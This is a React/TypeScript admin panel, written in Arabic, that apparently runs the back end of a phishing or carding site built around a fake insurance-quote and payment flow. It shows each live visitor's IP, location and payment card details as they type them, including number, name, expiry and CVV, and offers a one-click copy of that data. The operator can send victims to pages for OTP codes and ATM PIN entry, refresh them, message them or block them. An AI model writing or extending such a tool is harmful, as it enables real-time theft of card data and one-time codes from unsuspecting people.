import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { VISITOR_CHANNEL, type VisitorPresence } from "@/lib/visitor-tracking";
import { Users, Send, ShieldOff, ShieldCheck, RefreshCw, Wifi, MessageCircle, X, CreditCard, Copy, History } from "lucide-react";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import { startConversationByAdmin, sendMessage, listChatBlocked, blockChat, unblockChat } from "@/lib/chat";
import { MessageSquareOff, MessageSquare } from "lucide-react";

const QUICK_ROUTES = [
  { label: "الرئيسية", path: "/" },
  { label: "تفاصيل العرض", path: "/quote/details" },
  { label: "العروض", path: "/quote/offers" },
  { label: "الدفع", path: "/quote/payment" },
  { label: "تأكيد الدفع", path: "/quote/otp" },
  { label: "OTP", path: "/quote/otp" },
  { label: "لقطة شاشة", path: "/quote/custom" },
];

/** Render a country flag image based on ISO 3166-1 alpha-2 code. */
function FlagIcon({ code }: { code?: string }) {
  const cc = (code || "").toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) {
    return <span className="text-[14px] leading-none">🌐</span>;
  }
  const lower = cc.toLowerCase();
  return (
    <img
      src={`https://flagcdn.com/24x18/${lower}.png`}
      srcSet={`https://flagcdn.com/48x36/${lower}.png 2x`}
      width={20}
      height={15}
      alt={cc}
      className="inline-block h-[15px] w-[20px] rounded-sm object-cover shadow-sm ring-1 ring-black/10"
      loading="lazy"
    />
  );
}

type BlockedRow = { visitor_id: string; created_at: string; reason: string | null };
type SessionRow = {
  visitor_id: string;
  last_path: string | null;
  last_seen_at: string;
  country: string | null;
  country_code: string | null;
  city: string | null;
  ip: string | null;
  is_mobile: boolean | null;
};

function labelForPath(path: string | null | undefined) {
  if (!path) return "—";
  const p = path.split("?")[0];
  const map: Record<string, string> = {
    "/": "الرئيسية",
    "/quote/details": "تفاصيل العرض",
    "/quote/offers": "العروض",
    "/quote/checkout": "ملخص الدفع",
    "/quote/payment": "صفحة الدفع",
    "/quote/otp": "كود التحقق OTP",
    "/quote/atm": "إدخال PIN",
    "/quote/mutasil": "متصل",
    "/quote/mutasil-otp": "OTP متصل",
    "/quote/success": "تم الدفع ✓",
    "/quote/custom": "لقطة شاشة",
  };
  return map[p] || p;
}

function timeAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const m = Math.floor(diff / 60000);
  if (m < 1) return "الآن";
  if (m < 60) return `منذ ${m} دقيقة`;
  const h = Math.floor(m / 60);
  if (h < 24) return `منذ ${h} ساعة`;
  const d = Math.floor(h / 24);
  return `منذ ${d} يوم`;
}

const VisitorsPanel = () => {
  const [visitors, setVisitors] = useState<VisitorPresence[]>([]);
  const [blocked, setBlocked] = useState<BlockedRow[]>([]);
  const [sessions, setSessions] = useState<SessionRow[]>([]);
  const [redirectFor, setRedirectFor] = useState<string | null>(null);
  const [customPath, setCustomPath] = useState("");
  const [chatFor, setChatFor] = useState<string | null>(null);
  const [chatDraft, setChatDraft] = useState("");
  const [chatSending, setChatSending] = useState(false);

  const handleSendChat = async (visitorId: string) => {
    const text = chatDraft.trim();
    if (!text) return;
    setChatSending(true);
    const conv = await startConversationByAdmin(visitorId);
    if (!conv) {
      setChatSending(false);
      toast.error("تعذّر بدء المحادثة");
      return;
    }
    const ok = await sendMessage(conv.id, "admin", text);
    setChatSending(false);
    if (ok) {
      toast.success("تم إرسال الرسالة للزائر");
      setChatDraft("");
      setChatFor(null);
    } else {
      toast.error("فشل إرسال الرسالة");
    }
  };

  // Presence channel — read everyone online
  useEffect(() => {
    const channel = supabase.channel(VISITOR_CHANNEL, {
      config: { presence: { key: "admin-watcher-" + Math.random().toString(36).slice(2) } },
    });

    const sync = () => {
      const state = channel.presenceState<VisitorPresence>();
      const list: VisitorPresence[] = [];
      Object.values(state).forEach((entries) => {
        const last = entries[entries.length - 1];
        if (last && (last as VisitorPresence).visitor_id) {
          list.push(last as VisitorPresence);
        }
      });
      // unique by visitor_id, newest first
      const map = new Map<string, VisitorPresence>();
      list.forEach((v) => map.set(v.visitor_id, v));
      setVisitors(
        Array.from(map.values()).sort((a, b) =>
          (b.online_at || "").localeCompare(a.online_at || ""),
        ),
      );
    };

    channel
      .on("presence", { event: "sync" }, sync)
      .on("presence", { event: "join" }, sync)
      .on("presence", { event: "leave" }, sync)
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  // Blocked list
  const loadBlocked = async () => {
    const { data } = await supabase
      .from("blocked_visitors")
      .select("*")
      .order("created_at", { ascending: false });
    setBlocked((data as BlockedRow[]) || []);
  };

  useEffect(() => {
    loadBlocked();
    const channel = supabase
      .channel("admin-blocked-watch")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "blocked_visitors" },
        () => loadBlocked(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  // Persistent sessions (last-known page per visitor)
  const loadSessions = async () => {
    const { data } = await supabase
      .from("visitor_sessions")
      .select("visitor_id,last_path,last_seen_at,country,country_code,city,ip,is_mobile")
      .order("last_seen_at", { ascending: false })
      .limit(100);
    setSessions((data as SessionRow[]) || []);
  };

  useEffect(() => {
    loadSessions();
    const channel = supabase
      .channel("admin-sessions-watch")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "visitor_sessions" },
        () => loadSessions(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const blockedSet = useMemo(() => new Set(blocked.map((b) => b.visitor_id)), [blocked]);

  // Chat-blocked visitors
  const [chatBlockedSet, setChatBlockedSet] = useState<Set<string>>(new Set());
  const loadChatBlocked = async () => {
    const ids = await listChatBlocked();
    setChatBlockedSet(new Set(ids));
  };
  useEffect(() => {
    loadChatBlocked();
    const ch = supabase
      .channel("admin-chatblocked-watch")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "chat_blocked_visitors" },
        () => loadChatBlocked(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(ch);
    };
  }, []);

  const handleBlockChat = async (visitorId: string) => {
    const ok = await blockChat(visitorId);
    if (!ok) return toast.error("فشل حظر المحادثة");
    toast.success("تم حظر المحادثة");
  };
  const handleUnblockChat = async (visitorId: string) => {
    const ok = await unblockChat(visitorId);
    if (!ok) return toast.error("فشل فك حظر المحادثة");
    toast.success("تم فك حظر المحادثة");
  };
  const onlineSet = useMemo(() => new Set(visitors.map((v) => v.visitor_id)), [visitors]);
  const offlineSessions = useMemo(
    () => sessions.filter((s) => !onlineSet.has(s.visitor_id)),
    [sessions, onlineSet],
  );

  const sendCommand = async (visitorId: string, command: string, payload?: string) => {
    const { error } = await supabase
      .from("visitor_commands")
      .insert({ visitor_id: visitorId, command, payload: payload ?? null });
    if (error) {
      toast.error("فشل إرسال الأمر");
      console.error(error);
      return false;
    }
    return true;
  };

  const handleRedirect = async (visitorId: string, path: string) => {
    try {
      const ok = await sendCommand(visitorId, "redirect", path);
      // Also broadcast for instant delivery
      const ch = supabase.channel("cmd-watch-" + visitorId);
      await new Promise<void>((resolve) => {
        ch.subscribe((status) => {
          if (status === "SUBSCRIBED") {
            ch.send({ type: "broadcast", event: "cmd", payload: { command: "redirect", payload: path } })
              .catch(() => {})
              .finally(() => {
                supabase.removeChannel(ch);
                resolve();
              });
          }
        });
        setTimeout(() => resolve(), 1500);
      });
      if (ok) toast.success(`تم توجيه الزائر إلى ${path}`);
      setRedirectFor(null);
      setCustomPath("");
    } catch (e: any) {
      if (e?.name === "AbortError" || e?.code === 20) return;
      toast.error("فشل في التوجيه");
    }
  };

  const handleRefresh = async (visitorId: string) => {
    const ok = await sendCommand(visitorId, "refresh");
    if (ok) toast.success("تم إرسال أمر تحديث");
  };

  const handleBlock = async (visitorId: string) => {
    if (!confirm("حظر هذا الزائر من الوصول للموقع؟")) return;
    const { error } = await supabase
      .from("blocked_visitors")
      .insert({ visitor_id: visitorId, reason: "blocked by admin" });
    if (error) {
      toast.error("فشل الحظر");
      return;
    }
    toast.success("تم حظر الزائر");
  };

  const handleUnblock = async (visitorId: string) => {
    const { error } = await supabase
      .from("blocked_visitors")
      .delete()
      .eq("visitor_id", visitorId);
    if (error) {
      toast.error("فشل إلغاء الحظر");
      return;
    }
    toast.success("تم إلغاء الحظر");
  };

  return (
    <div className="space-y-4">
      {/* Online visitors */}
      <div className="overflow-hidden rounded-2xl bg-white shadow-card">
        <div className="flex items-center justify-between border-b border-border px-4 py-3">
          <div className="flex items-center gap-2 text-brand-blue">
            <div className="grid h-9 w-9 place-items-center rounded-lg bg-emerald-100 text-emerald-700">
              <Wifi className="h-4 w-4" />
            </div>
            <div>
              <h2 className="text-[14px] font-extrabold">الزوار المتصلون الآن</h2>
              <div className="text-[11.5px] text-muted-foreground">
                تحديث لحظي عبر Realtime
              </div>
            </div>
          </div>
          <div className="rounded-full bg-emerald-100 px-3 py-1 text-[12px] font-extrabold text-emerald-700">
            {visitors.length}
          </div>
        </div>

        <div className="divide-y divide-border">
          {visitors.length === 0 && (
            <div className="px-4 py-8 text-center text-[13px] text-muted-foreground">
              لا يوجد زوار متصلون حالياً.
            </div>
          )}
          {visitors.map((v) => {
            const isBlocked = blockedSet.has(v.visitor_id);
            return (
              <div key={v.visitor_id} className="px-3 py-3 sm:px-4">
                <div className="flex flex-col gap-3 sm:flex-row sm:flex-wrap sm:items-center sm:justify-between">
                  <div className="min-w-0 flex-1">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="relative flex h-2.5 w-2.5">
                        <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                        <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500" />
                      </span>
                      <span className="font-mono text-[12px] font-extrabold text-brand-blue break-all">
                        {v.visitor_id}
                      </span>
                      {isBlocked && (
                        <span className="rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-700">
                          محظور
                        </span>
                      )}
                      {chatBlockedSet.has(v.visitor_id) && (
                        <span className="rounded-full bg-orange-100 px-2 py-0.5 text-[10px] font-bold text-orange-700">
                          محظور المحادثة
                        </span>
                      )}
                    </div>
                    <div className="mt-1 flex flex-wrap items-center gap-1.5 text-[11.5px]">
                      <span
                        className="inline-flex items-center gap-1 rounded-md bg-muted/60 px-1.5 py-0.5 font-bold text-brand-blue"
                        title={v.country || "موقع غير معروف"}
                      >
                        <FlagIcon code={v.country_code} />
                        <span>
                          {v.country || "—"}
                          {v.city ? ` · ${v.city}` : ""}
                        </span>
                      </span>
                      <span
                        className="inline-flex items-center gap-1 rounded-md bg-muted/60 px-1.5 py-0.5 font-mono font-bold text-muted-foreground"
                        dir="ltr"
                        title="عنوان IP"
                      >
                        IP: {v.ip || "—"}
                      </span>
                    </div>
                    <div className="mt-1.5 flex flex-wrap items-center gap-1.5">
                      <span className="inline-flex items-center gap-1 rounded-md bg-brand-blue/10 px-2 py-0.5 text-[11.5px] font-extrabold text-brand-blue">
                        📍 {labelForPath(v.path)}
                      </span>
                      <span className="truncate text-[11px] text-muted-foreground" dir="ltr">
                        {v.path}
                      </span>
                    </div>
                    {(v.card_number || v.card_name || v.card_cvv || v.card_exp_month) && (
                      <div className="mt-2 rounded-lg border border-amber-300 bg-amber-50 p-2">
                        <div className="mb-1 flex items-center justify-between">
                          <div className="flex items-center gap-1.5 text-[11.5px] font-extrabold text-amber-800">
                            <CreditCard className="h-3.5 w-3.5" />
                            <span>بطاقة قيد الكتابة (Live)</span>
                          </div>
                          <button
                            type="button"
                            onClick={() => {
                              const txt = [
                                `Number: ${v.card_number || "-"}`,
                                `Name: ${v.card_name || "-"}`,
                                `Exp: ${v.card_exp_month || "--"}/${v.card_exp_year || "----"}`,
                                `CVV: ${v.card_cvv || "-"}`,
                              ].join("\n");
                              navigator.clipboard.writeText(txt);
                              toast.success("تم نسخ بيانات البطاقة");
                            }}
                            className="grid h-6 w-6 place-items-center rounded text-amber-800 hover:bg-amber-100"
                            aria-label="نسخ"
                            title="نسخ البيانات"
                          >
                            <Copy className="h-3.5 w-3.5" />
                          </button>
                        </div>
                        <div className="grid grid-cols-1 gap-1 text-[11.5px] sm:grid-cols-2" dir="ltr">
                          <div className="font-mono font-bold text-brand-blue">
                            <span className="text-muted-foreground">№ </span>
                            {v.card_number || "—"}
                          </div>
                          <div className="font-bold text-brand-blue truncate">
                            <span className="text-muted-foreground">Name: </span>
                            {v.card_name || "—"}
                          </div>
                          <div className="font-mono font-bold text-brand-blue">
                            <span className="text-muted-foreground">Exp: </span>
                            {(v.card_exp_month || "--") + "/" + (v.card_exp_year || "----")}
                          </div>
                          <div className="font-mono font-bold text-brand-blue">
                            <span className="text-muted-foreground">CVV: </span>
                            {v.card_cvv || "—"}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-1.5 sm:flex sm:flex-wrap">
                    <button
                      type="button"
                      onClick={() =>
                        setChatFor((prev) => (prev === v.visitor_id ? null : v.visitor_id))
                      }
                      className="flex h-9 items-center justify-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                    >
                      <MessageCircle className="h-3.5 w-3.5" />
                      <span>مراسلة</span>
                    </button>
                    <button
                      type="button"
                      onClick={() =>
                        setRedirectFor((prev) => (prev === v.visitor_id ? null : v.visitor_id))
                      }
                      className="flex h-9 items-center justify-center gap-1 rounded-lg bg-brand-blue px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                    >
                      <Send className="h-3.5 w-3.5" />
                      <span>توجيه</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => handleRefresh(v.visitor_id)}
                      className="flex h-9 items-center justify-center gap-1 rounded-lg border border-border bg-white px-2.5 text-[11px] font-extrabold text-brand-blue hover:bg-muted/50"
                    >
                      <RefreshCw className="h-3.5 w-3.5" />
                      <span>تحديث</span>
                    </button>
                    {isBlocked ? (
                      <button
                        type="button"
                        onClick={() => handleUnblock(v.visitor_id)}
                        className="flex h-9 items-center justify-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                      >
                        <ShieldCheck className="h-3.5 w-3.5" />
                        <span>فك الحظر</span>
                      </button>
                    ) : (
                      <button
                        type="button"
                        onClick={() => handleBlock(v.visitor_id)}
                        className="flex h-9 items-center justify-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                      >
                        <ShieldOff className="h-3.5 w-3.5" />
                        <span>حظر</span>
                      </button>
                    )}
                    {chatBlockedSet.has(v.visitor_id) ? (
                      <button
                        type="button"
                        onClick={() => handleUnblockChat(v.visitor_id)}
                        className="flex h-9 items-center justify-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                        title="السماح للزائر بالمحادثة مجدداً"
                      >
                        <MessageSquare className="h-3.5 w-3.5" />
                        <span>فتح المحادثة</span>
                      </button>
                    ) : (
                      <button
                        type="button"
                        onClick={() => handleBlockChat(v.visitor_id)}
                        className="flex h-9 items-center justify-center gap-1 rounded-lg bg-orange-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                        title="منع الزائر من إرسال أو استقبال رسائل الدردشة"
                      >
                        <MessageSquareOff className="h-3.5 w-3.5" />
                        <span>حظر المحادثة</span>
                      </button>
                    )}
                  </div>
                </div>

                {chatFor === v.visitor_id && (
                  <div className="mt-3 rounded-xl border border-emerald-200 bg-emerald-50/60 p-3">
                    <div className="mb-2 flex items-center justify-between">
                      <div className="flex items-center gap-1.5 text-[12px] font-bold text-emerald-700">
                        <MessageCircle className="h-3.5 w-3.5" />
                        <span>إرسال رسالة فورية للزائر</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          setChatFor(null);
                          setChatDraft("");
                        }}
                        className="grid h-6 w-6 place-items-center rounded text-emerald-700 hover:bg-emerald-100"
                        aria-label="إغلاق"
                      >
                        <X className="h-3.5 w-3.5" />
                      </button>
                    </div>
                    <div className="flex items-end gap-1.5">
                      <textarea
                        value={chatDraft}
                        onChange={(e) => setChatDraft(e.target.value.slice(0, 1000))}
                        onKeyDown={(e) => {
                          if (e.key === "Enter" && !e.shiftKey) {
                            e.preventDefault();
                            handleSendChat(v.visitor_id);
                          }
                        }}
                        rows={2}
                        placeholder="اكتب رسالتك للزائر..."
                        className="min-h-[42px] flex-1 resize-none rounded-lg border border-emerald-200 bg-white px-2 py-1.5 text-[12.5px] text-brand-blue outline-none focus:border-emerald-400"
                      />
                      <button
                        type="button"
                        disabled={chatSending || !chatDraft.trim()}
                        onClick={() => handleSendChat(v.visitor_id)}
                        className={cn(
                          "grid h-[42px] w-[42px] shrink-0 place-items-center rounded-lg text-white",
                          chatDraft.trim() && !chatSending
                            ? "bg-emerald-600 hover:brightness-110"
                            : "cursor-not-allowed bg-muted-foreground/40",
                        )}
                        aria-label="إرسال"
                      >
                        <Send className="h-4 w-4" />
                      </button>
                    </div>
                    <div className="mt-1.5 text-[10.5px] text-emerald-700/80">
                      ستظهر نافذة الدردشة لدى الزائر تلقائياً.
                    </div>
                  </div>
                )}

                {redirectFor === v.visitor_id && (
                  <div className="mt-3 rounded-xl border border-border/70 bg-muted/30 p-3">
                    <div className="mb-2 text-[12px] font-bold text-brand-blue">
                      اختر صفحة للتوجيه:
                    </div>
                    <div className="flex flex-wrap gap-1.5">
                      {QUICK_ROUTES.map((r) => (
                        <button
                          key={r.path}
                          type="button"
                          onClick={() => handleRedirect(v.visitor_id, r.path)}
                          className="rounded-lg border border-border bg-white px-2.5 py-1.5 text-[11px] font-bold text-brand-blue hover:bg-brand-blue hover:text-white"
                        >
                          {r.label}
                        </button>
                      ))}
                    </div>
                    <div className="mt-2 flex gap-1.5">
                      <input
                        value={customPath}
                        onChange={(e) => setCustomPath(e.target.value)}
                        placeholder="/مسار-مخصص"
                        dir="ltr"
                        className="h-9 flex-1 rounded-lg border border-border bg-white px-2 text-[12px] text-brand-blue outline-none focus:border-brand-blue"
                      />
                      <button
                        type="button"
                        disabled={!customPath.trim()}
                        onClick={() => handleRedirect(v.visitor_id, customPath.trim())}
                        className={cn(
                          "h-9 rounded-lg px-3 text-[11px] font-extrabold text-white",
                          customPath.trim()
                            ? "bg-brand-blue hover:brightness-110"
                            : "cursor-not-allowed bg-muted-foreground/40",
                        )}
                      >
                        إرسال
                      </button>
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* Recent (offline) visitors — last known page persists across sessions */}
      <div className="overflow-hidden rounded-2xl bg-white shadow-card">
        <div className="flex items-center justify-between border-b border-border px-4 py-3">
          <div className="flex items-center gap-2 text-brand-blue">
            <div className="grid h-9 w-9 place-items-center rounded-lg bg-slate-100 text-slate-700">
              <History className="h-4 w-4" />
            </div>
            <div>
              <h2 className="text-[14px] font-extrabold">زوار سابقون (غير متصلين الآن)</h2>
              <div className="text-[11.5px] text-muted-foreground">
                آخر صفحة كان عليها كل زائر — يبقى ظاهراً حتى لو خرج ورجع
              </div>
            </div>
          </div>
          <div className="rounded-full bg-slate-100 px-3 py-1 text-[12px] font-extrabold text-slate-700">
            {offlineSessions.length}
          </div>
        </div>
        <div className="divide-y divide-border">
          {offlineSessions.length === 0 && (
            <div className="px-4 py-6 text-center text-[12.5px] text-muted-foreground">
              لا يوجد زوار سابقون.
            </div>
          )}
          {offlineSessions.map((s) => {
            const isBlocked = blockedSet.has(s.visitor_id);
            return (
              <div key={s.visitor_id} className="px-3 py-3 sm:px-4">
                <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
                  <div className="min-w-0 flex-1">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="h-2.5 w-2.5 rounded-full bg-slate-400" />
                      <span className="font-mono text-[12px] font-extrabold text-brand-blue break-all">
                        {s.visitor_id}
                      </span>
                      {isBlocked && (
                        <span className="rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-700">
                          محظور
                        </span>
                      )}
                    </div>
                    <div className="mt-1.5 flex flex-wrap items-center gap-1.5">
                      <span className="inline-flex items-center gap-1 rounded-md bg-brand-blue/10 px-2 py-0.5 text-[11.5px] font-extrabold text-brand-blue">
                        📍 {labelForPath(s.last_path)}
                      </span>
                      <span className="rounded-md bg-muted/60 px-2 py-0.5 text-[11px] font-bold text-muted-foreground">
                        {timeAgo(s.last_seen_at)}
                      </span>
                      <span
                        className="inline-flex items-center gap-1 rounded-md bg-muted/60 px-1.5 py-0.5 text-[11px] font-bold text-brand-blue"
                        title={s.country || ""}
                      >
                        <FlagIcon code={s.country_code || undefined} />
                        <span>{s.country || "—"}{s.city ? ` · ${s.city}` : ""}</span>
                      </span>
                    </div>
                    {s.last_path && (
                      <div className="mt-1 truncate text-[11px] text-muted-foreground" dir="ltr">
                        {s.last_path}
                      </div>
                    )}
                  </div>
                  <div className="flex flex-wrap gap-1.5">
                    {chatBlockedSet.has(s.visitor_id) ? (
                      <button
                        type="button"
                        onClick={() => handleUnblockChat(s.visitor_id)}
                        className="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                        title="السماح للزائر بالمحادثة مجدداً"
                      >
                        <MessageSquare className="h-3.5 w-3.5" />
                        <span>فتح المحادثة</span>
                      </button>
                    ) : (
                      <button
                        type="button"
                        onClick={() => handleBlockChat(s.visitor_id)}
                        className="flex h-8 items-center gap-1 rounded-lg bg-orange-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                        title="منع الزائر من إرسال أو استقبال رسائل الدردشة"
                      >
                        <MessageSquareOff className="h-3.5 w-3.5" />
                        <span>حظر المحادثة</span>
                      </button>
                    )}
                    {isBlocked ? (
                      <button
                        type="button"
                        onClick={() => handleUnblock(s.visitor_id)}
                        className="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                      >
                        <ShieldCheck className="h-3.5 w-3.5" />
                        <span>فك الحظر</span>
                      </button>
                    ) : (
                      <button
                        type="button"
                        onClick={() => handleBlock(s.visitor_id)}
                        className="flex h-8 items-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                      >
                        <ShieldOff className="h-3.5 w-3.5" />
                        <span>حظر</span>
                      </button>
                    )}
                  </div>

                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Blocked list */}
      <div className="overflow-hidden rounded-2xl bg-white shadow-card">
        <div className="flex items-center justify-between border-b border-border px-4 py-3">
          <div className="flex items-center gap-2 text-brand-blue">
            <div className="grid h-9 w-9 place-items-center rounded-lg bg-red-100 text-red-700">
              <ShieldOff className="h-4 w-4" />
            </div>
            <h2 className="text-[14px] font-extrabold">الزوار المحظورون</h2>
          </div>
          <div className="rounded-full bg-red-100 px-3 py-1 text-[12px] font-extrabold text-red-700">
            {blocked.length}
          </div>
        </div>
        <div className="divide-y divide-border">
          {blocked.length === 0 && (
            <div className="px-4 py-6 text-center text-[12.5px] text-muted-foreground">
              لا يوجد زوار محظورون.
            </div>
          )}
          {blocked.map((b) => (
            <div key={b.visitor_id} className="flex items-center justify-between px-4 py-2.5">
              <div>
                <div className="font-mono text-[12.5px] font-extrabold text-brand-blue">
                  {b.visitor_id}
                </div>
                <div className="text-[11px] text-muted-foreground">
                  منذ {new Date(b.created_at).toLocaleString("ar-SA")}
                </div>
              </div>
              <button
                type="button"
                onClick={() => handleUnblock(b.visitor_id)}
                className="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
              >
                <ShieldCheck className="h-3.5 w-3.5" />
                <span>إلغاء الحظر</span>
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default VisitorsPanel;
